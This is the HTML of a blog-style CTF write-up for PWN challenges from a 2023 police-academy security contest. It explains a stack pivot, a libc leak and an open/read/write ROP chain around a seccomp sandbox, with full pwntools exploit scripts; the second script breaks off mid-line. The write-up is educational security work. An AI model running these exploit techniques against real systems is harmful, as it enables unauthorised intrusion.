@@ -1,0 +1,489 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="baidu-site-verification" content="codeva-ROfYcqLkCh" />
+    <meta name="msvalidate.01" content="ECA3E06A0E52A2AC90C4B06F12981FB2" />
+    <meta name="description" content="SandBox链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1l3NhZ1xYwca48nf1p88iDg提取码：05zg 题目开启了沙箱机制  沙箱(Sandbox)是程序运行过程中的一种隔离机制，其目的是限制不可信进程和不可信代码的访问权限。计算机领域的虚拟技术，常见于安全方向。会禁用一些系统调用 实现沙箱机制  一种采用prctl函数调用  一种是使用seccomp库函数。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2023黄河流域公安院校网络空间安全技能挑战赛 PWN">
+<meta property="og:url" content="https://grxer.gitee.io/2023/03/05/sd-police2023-pwn/index.html">
+<meta property="og:site_name" content="Grxer&#39;s Blog">
+<meta property="og:description" content="SandBox链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1l3NhZ1xYwca48nf1p88iDg提取码：05zg 题目开启了沙箱机制  沙箱(Sandbox)是程序运行过程中的一种隔离机制，其目的是限制不可信进程和不可信代码的访问权限。计算机领域的虚拟技术，常见于安全方向。会禁用一些系统调用 实现沙箱机制  一种采用prctl函数调用  一种是使用seccomp库函数。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://grxer.gitee.io/2023/03/05/sd-police2023-pwn/image-20230305122657981.png">
+<meta property="og:image" content="https://grxer.gitee.io/2023/03/05/sd-police2023-pwn/image-20230305154743044.png">
+<meta property="og:image" content="https://grxer.gitee.io/2023/03/05/sd-police2023-pwn/image-20230305155002168.png">
+<meta property="og:image" content="https://grxer.gitee.io/2023/03/05/sd-police2023-pwn/image-20230305155441801.png">
+<meta property="og:image" content="https://grxer.gitee.io/2023/03/05/sd-police2023-pwn/image-20230305161933424.png">
+<meta property="og:image" content="https://grxer.gitee.io/2023/03/05/sd-police2023-pwn/image-20230305231637179.png">
+<meta property="og:image" content="https://grxer.gitee.io/2023/03/05/sd-police2023-pwn/image-20230306010914175.png">
+<meta property="og:image" content="https://grxer.gitee.io/2023/03/05/sd-police2023-pwn/image-20230306012654458.png">
+<meta property="og:image" content="https://grxer.gitee.io/2023/03/05/sd-police2023-pwn/image-20230306122938871.png">
+<meta property="og:image" content="https://grxer.gitee.io/2023/03/05/sd-police2023-pwn/image-20230306141247754.png">
+<meta property="og:image" content="https://grxer.gitee.io/2023/03/05/sd-police2023-pwn/image-20230307000430195.png">
+<meta property="article:published_time" content="2023-03-05T03:39:52.000Z">
+<meta property="article:modified_time" content="2023-05-13T05:03:53.545Z">
+<meta property="article:author" content="bxz">
+<meta property="article:tag" content="Stack Migration">
+<meta property="article:tag" content="Sandbox">
+<meta property="article:tag" content="Getdents64 Leak">
+<meta property="article:tag" content="Mprotect">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://grxer.gitee.io/2023/03/05/sd-police2023-pwn/image-20230305122657981.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>2023黄河流域公安院校网络空间安全技能挑战赛 PWN</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 lrt">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2023/03/10/Chunk-Extend-and-Overlapping/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2023/03/04/Using-After-Free/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://grxer.gitee.io/2023/03/05/sd-police2023-pwn/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://grxer.gitee.io/2023/03/05/sd-police2023-pwn/&text=2023黄河流域公安院校网络空间安全技能挑战赛 PWN"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://grxer.gitee.io/2023/03/05/sd-police2023-pwn/&title=2023黄河流域公安院校网络空间安全技能挑战赛 PWN"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://grxer.gitee.io/2023/03/05/sd-police2023-pwn/&is_video=false&description=2023黄河流域公安院校网络空间安全技能挑战赛 PWN"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=2023黄河流域公安院校网络空间安全技能挑战赛 PWN&body=Check out this article: https://grxer.gitee.io/2023/03/05/sd-police2023-pwn/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://grxer.gitee.io/2023/03/05/sd-police2023-pwn/&title=2023黄河流域公安院校网络空间安全技能挑战赛 PWN"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://grxer.gitee.io/2023/03/05/sd-police2023-pwn/&title=2023黄河流域公安院校网络空间安全技能挑战赛 PWN"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://grxer.gitee.io/2023/03/05/sd-police2023-pwn/&title=2023黄河流域公安院校网络空间安全技能挑战赛 PWN"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://grxer.gitee.io/2023/03/05/sd-police2023-pwn/&title=2023黄河流域公安院校网络空间安全技能挑战赛 PWN"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://grxer.gitee.io/2023/03/05/sd-police2023-pwn/&name=2023黄河流域公安院校网络空间安全技能挑战赛 PWN&description=&lt;h1 id=&#34;SandBox&#34;&gt;&lt;a href=&#34;#SandBox&#34; class=&#34;headerlink&#34; title=&#34;SandBox&#34;&gt;&lt;/a&gt;SandBox&lt;/h1&gt;&lt;p&gt;链接：&lt;a href=&#34;https://pan.baidu.com/s/1l3NhZ1xYwca48nf1p88iDg&#34;&gt;https://pan.baidu.com/s/1l3NhZ1xYwca48nf1p88iDg&lt;/a&gt;&lt;br&gt;提取码：05zg&lt;/p&gt;
+&lt;p&gt;题目开启了沙箱机制&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;沙箱(Sandbox)是程序运行过程中的一种隔离机制，其目的是限制不可信进程和不可信代码的访问权限。计算机领域的虚拟技术，常见于安全方向。会禁用一些系统调用&lt;/p&gt;
+&lt;p&gt;实现沙箱机制&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;一种采用prctl函数调用&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;一种是使用seccomp库函数。&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/blockquote&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://grxer.gitee.io/2023/03/05/sd-police2023-pwn/&t=2023黄河流域公安院校网络空间安全技能挑战赛 PWN"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SandBox"><span class="toc-number">1.</span> <span class="toc-text">SandBox</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%88%E8%BF%81%E7%A7%BB"><span class="toc-number">1.1.</span> <span class="toc-text">栈迁移</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ORW%E8%AF%BB%E5%8F%96flag"><span class="toc-number">1.2.</span> <span class="toc-text">ORW读取flag</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP"><span class="toc-number">1.3.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#flag"><span class="toc-number">2.</span> <span class="toc-text">flag?????</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#mprotect%E4%BF%AE%E6%94%B9%E6%9D%83%E9%99%90"><span class="toc-number">2.1.</span> <span class="toc-text">mprotect修改权限</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#getdents64%E6%B3%84%E9%9C%B2%E6%96%87%E4%BB%B6%E5%90%8D"><span class="toc-number">2.2.</span> <span class="toc-text">getdents64泄露文件名</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP-%E8%BF%99%E9%87%8C%E5%85%B6%E5%AE%9E%E5%8F%AF%E4%BB%A5%E5%B0%81%E8%A3%85%E4%B8%AA%E5%87%BD%E6%95%B0%EF%BC%8C%E6%87%92%E5%BE%97%E6%90%9E%E4%BA%86"><span class="toc-number">2.3.</span> <span class="toc-text">EXP 这里其实可以封装个函数，懒得搞了</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        2023黄河流域公安院校网络空间安全技能挑战赛 PWN
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">bxz</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-03-05T03:39:52.000Z" itemprop="datePublished">2023-03-05</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/Getdents64-Leak/" rel="tag">Getdents64 Leak</a>, <a class="tag-link-link" href="/tags/Mprotect/" rel="tag">Mprotect</a>, <a class="tag-link-link" href="/tags/Sandbox/" rel="tag">Sandbox</a>, <a class="tag-link-link" href="/tags/Stack-Migration/" rel="tag">Stack Migration</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="SandBox"><a href="#SandBox" class="headerlink" title="SandBox"></a>SandBox</h1><p>链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1l3NhZ1xYwca48nf1p88iDg">https://pan.baidu.com/s/1l3NhZ1xYwca48nf1p88iDg</a><br>提取码：05zg</p>
+<p>题目开启了沙箱机制</p>
+<blockquote>
+<p>沙箱(Sandbox)是程序运行过程中的一种隔离机制，其目的是限制不可信进程和不可信代码的访问权限。计算机领域的虚拟技术，常见于安全方向。会禁用一些系统调用</p>
+<p>实现沙箱机制</p>
+<ul>
+<li><p>一种采用prctl函数调用</p>
+</li>
+<li><p>一种是使用seccomp库函数。</p>
+</li>
+</ul>
+</blockquote>
+<span id="more"></span>
+
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/p/police-pwn-2023&gt; checksec sandbox</span><br><span class="line">[*] &#x27;/home/grxer/Desktop/pwn/police-pwn-2023/sandbox&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">grxer@grxer ~/D/p/police-pwn-2023&gt; seccomp-tools dump ./sandbox</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0001: 0x15 0x01 0x00 0x0000003b  if (A == execve) goto 0003</span><br><span class="line"> 0002: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0003: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure>
+
+<p>可以看到禁用了execve系统调用，同时system是不能使用的，因为system是glibc中的函数，用shell来调用程序&#x3D;fork+exec+waitpid</p>
+<img src="/2023/03/05/sd-police2023-pwn/image-20230305122657981.png" alt="image-20230305122657981" style="zoom:80%;">
+
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">80</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line"></span><br><span class="line">  io(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;A bit small, but it doesn&#x27;t affect me cat flag&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x60</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="栈迁移"><a href="#栈迁移" class="headerlink" title="栈迁移"></a>栈迁移</h2><p>只有0x10个字节的大小，我们先进行栈迁移</p>
+<p>选择bss&#x3D;0x404500</p>
+<ul>
+<li><p>我们先payload&#x3D;padding+p64(bss)+p64(read_ret)，由于是采用leave ret平栈，会把rbp改为bss地址，ret 到read</p>
+<ul>
+<li><img src="/2023/03/05/sd-police2023-pwn/image-20230305154743044.png" alt="image-20230305154743044" style="zoom: 67%;"></li>
+</ul>
+</li>
+<li><p>payload&#x3D;padding+p64(bss+0x50)+p64(read_ret)，我们在bss-0x50输入</p>
+<ul>
+<li><img src="/2023/03/05/sd-police2023-pwn/image-20230305155002168.png" alt="image-20230305155002168" style="zoom:80%;"></li>
+</ul>
+</li>
+<li><p>平栈后我们的rsp为0x404510(因为在leave mov esp,ebp后需要pop rbp和ret栈顶rsp会提高0x10),rbp为0x404550，再次返回read</p>
+<ul>
+<li><img src="/2023/03/05/sd-police2023-pwn/image-20230305155441801.png" alt="image-20230305155441801" style="zoom:80%;"></li>
+</ul>
+</li>
+<li><p>payload&#x3D;p64(bss+0x60)+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(main)会在bss输入payload</p>
+<ul>
+<li><img src="/2023/03/05/sd-police2023-pwn/image-20230305161933424.png" alt="image-20230305161933424"></li>
+</ul>
+</li>
+<li><p>这里我们call read函数时会把返回地址放在0x404508处，我们把他覆盖为了pop rdi ；ret，所以在返回时就可以输出got表返回main</p>
+<ul>
+<li><img src="/2023/03/05/sd-police2023-pwn/image-20230305231637179.png" alt="image-20230305231637179" style="zoom:67%;"></li>
+</ul>
+</li>
+<li><p>这样我们就可以返回main，再次循环利用迁移和覆盖read返回</p>
+</li>
+</ul>
+<h2 id="ORW读取flag"><a href="#ORW读取flag" class="headerlink" title="ORW读取flag"></a>ORW读取flag</h2><p>对于<strong>32<em>位程序，应调用</em></strong>int $0x80进入系统调用，将系统调用号传入eax，各个参数按照ebx、ecx、edx的顺序传递到寄存器中，系统调用返回值储存到eax寄存器。</p>
+<p>对于64位程序，应调用 syscall进入系统调用，将系统调用号传入rax，各个参数按照rdi、rsi、rdx的顺序传递到寄存器中，系统调用返回值储存到rax寄存器。</p>
+<p>从使用上来看</p>
+<ul>
+<li>约定的传递参数的寄存器不同<ul>
+<li>syscall 使用的是 edi 、 esi 、 edx 、 ecx，</li>
+<li>int 0x80 使用的是 ebx 、 ecx 、 edx 、 esi 、 edi</li>
+</ul>
+</li>
+</ul>
+<p>从内部机制来看</p>
+<ul>
+<li>syscall 调用的是C库函数，是在用户空间的，并且最终还是会调用内核函数（入口点）</li>
+<li>int 0x80 调用的是内核函数，是在内核空间的</li>
+</ul>
+<p>我们先把‘.&#x2F;flag’字符串通过read函数写入内存payload&#x3D;b’deadbeef’+p64(rdi)+p64(0)+p64(rsi_r15)+p64(0x404900)+p64(0x40)+p64(read_addr)+p64(main)</p>
+<blockquote>
+<p>三个文件描述符</p>
+<p>0 标准输入</p>
+<p>1 标志输出 </p>
+<p>2 标志错误 </p>
+</blockquote>
+<p>在利用标准库里的syscall打开flag文件，read读取到内存</p>
+<p>payload&#x3D;b’deadbeef’+p64(rdi)+p64(0x2)+p64(pop_rsi)+p64(0x404900)+p64(base+libc.sym[‘syscall’])<br>payload+&#x3D;p64(rdi)+p64(3)+p64(pop_rsi)+p64(0x404900)+p64(base+libc.sym[‘read’])+p64(main)</p>
+<blockquote>
+<p>syscall汇编如下</p>
+<p><img src="/2023/03/05/sd-police2023-pwn/image-20230306010914175.png" alt="image-20230306010914175"></p>
+<p>会把rdi rsi rdx等，依次给到rax rdi  rsi等 再内核函数syscall系统调用</p>
+<p>open打开文件描述符需要提供给read函数，一般都是从3开始(012被标志占用)</p>
+</blockquote>
+<p>最后读取flag到标准输出，payload&#x3D;b’deadbeef’+p64(rdi)+p64(1)+p64(rsi_r15)+p64(0x404900)+p64(0x100)+p64(base+libc.sym[‘write’])+p64(main)</p>
+<p>拿到flag</p>
+<p><img src="/2023/03/05/sd-police2023-pwn/image-20230306012654458.png" alt="image-20230306012654458"></p>
+<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./sandbox&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line">libc= ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote(<span class="string">&#x27;1.13.251.106&#x27;</span>,<span class="string">&#x27;8004&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line"><span class="comment"># db(&#x27;b *0x401214&#x27;)</span></span><br><span class="line">rdi=<span class="number">0x401283</span></span><br><span class="line">rsi_r15=<span class="number">0x0401281</span> </span><br><span class="line">read_ret=<span class="number">0x4011F1</span></span><br><span class="line">bss=<span class="number">0x404500</span></span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main=elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">padding=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x50</span></span><br><span class="line">payload=padding+p64(bss)+p64(read_ret)</span><br><span class="line">sa(<span class="string">b&#x27;flag\n&#x27;</span>,payload)</span><br><span class="line">payload=padding+p64(bss+<span class="number">0x50</span>)+p64(read_ret)</span><br><span class="line">sa(<span class="string">b&#x27;flag\n&#x27;</span>,payload)</span><br><span class="line">p(<span class="string">&#x27;main&#x27;</span>,main)</span><br><span class="line">payload=<span class="string">b&#x27;deadbeef&#x27;</span>+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(main)</span><br><span class="line">sa(<span class="string">b&#x27;flag\n&#x27;</span>,payload)</span><br><span class="line">puts_ad=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p(<span class="string">&quot;puts_ad&quot;</span>,puts_ad)</span><br><span class="line"></span><br><span class="line">base=puts_ad-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">read_addr = base + libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">pop_rsi = base + <span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rsi;ret;&#x27;</span>)))</span><br><span class="line">mprotect = base + libc.sym[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">p(<span class="string">&#x27;read_addr&#x27;</span>,read_addr)</span><br><span class="line">padding=<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x50</span></span><br><span class="line">payload=padding+p64(bss)+p64(read_ret)</span><br><span class="line">sa(<span class="string">b&#x27;flag\n&#x27;</span>,payload)</span><br><span class="line">payload=padding+p64(bss+<span class="number">0x50</span>)+p64(read_ret)</span><br><span class="line">sa(<span class="string">b&#x27;flag\n&#x27;</span>,payload)</span><br><span class="line">payload=<span class="string">b&#x27;deadbeef&#x27;</span>+p64(rdi)+p64(<span class="number">0</span>)+p64(rsi_r15)+p64(<span class="number">0x404900</span>)+p64(<span class="number">0x40</span>)+p64(read_addr)+p64(main)</span><br><span class="line">sa(<span class="string">b&#x27;flag\n&#x27;</span>,payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">s(<span class="string">&#x27;./flag&#x27;</span>)</span><br><span class="line"></span><br><span class="line">padding=<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x50</span></span><br><span class="line">payload=padding+p64(bss)+p64(read_ret)</span><br><span class="line">sa(<span class="string">b&#x27;flag\n&#x27;</span>,payload)</span><br><span class="line">payload=padding+p64(bss+<span class="number">0x50</span>)+p64(read_ret)</span><br><span class="line">sa(<span class="string">b&#x27;flag\n&#x27;</span>,payload)</span><br><span class="line">payload=<span class="string">b&#x27;deadbeef&#x27;</span>+p64(rdi)+p64(<span class="number">0x2</span>)+p64(pop_rsi)+p64(<span class="number">0x404900</span>)+p64(base+libc.sym[<span class="string">&#x27;syscall&#x27;</span>])</span><br><span class="line">payload+=p64(rdi)+p64(<span class="number">3</span>)+p64(pop_rsi)+p64(<span class="number">0x404900</span>)+p64(base+libc.sym[<span class="string">&#x27;read&#x27;</span>])+p64(main)</span><br><span class="line">sa(<span class="string">b&#x27;flag\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">padding=<span class="string">b&#x27;d&#x27;</span>*<span class="number">0x50</span></span><br><span class="line">payload=padding+p64(bss)+p64(read_ret)</span><br><span class="line">sa(<span class="string">b&#x27;flag\n&#x27;</span>,payload)</span><br><span class="line">payload=padding+p64(bss+<span class="number">0x50</span>)+p64(read_ret)</span><br><span class="line">sa(<span class="string">b&#x27;flag\n&#x27;</span>,payload)</span><br><span class="line">payload=<span class="string">b&#x27;deadbeef&#x27;</span>+p64(rdi)+p64(<span class="number">1</span>)+p64(rsi_r15)+p64(<span class="number">0x404900</span>)+p64(<span class="number">0x100</span>)+p64(base+libc.sym[<span class="string">&#x27;write&#x27;</span>])+p64(main)</span><br><span class="line"></span><br><span class="line">sa(<span class="string">b&#x27;flag\n&#x27;</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="flag"><a href="#flag" class="headerlink" title="flag?????"></a>flag?????</h1><p>链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1kHoiI7gXN0RLVzY1q7RPng">https://pan.baidu.com/s/1kHoiI7gXN0RLVzY1q7RPng</a><br>提取码：pdi2</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/p/police-pwn-2023&gt; checksec pwn3</span><br><span class="line">[*] &#x27;/home/grxer/Desktop/pwn/police-pwn-2023/pwn3&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">96</span>]; <span class="comment">// [rsp+0h] [rbp-60h] BYREF</span></span><br><span class="line"></span><br><span class="line">  io(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x70</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>和sandbox一样，只有0x10字节的溢出，seccomp-tools检测了一下并没有沙箱，简简单单拿个shellZzz，直接栈迁移ROP</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./flag???&#x27;</span></span><br><span class="line">libc= ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span 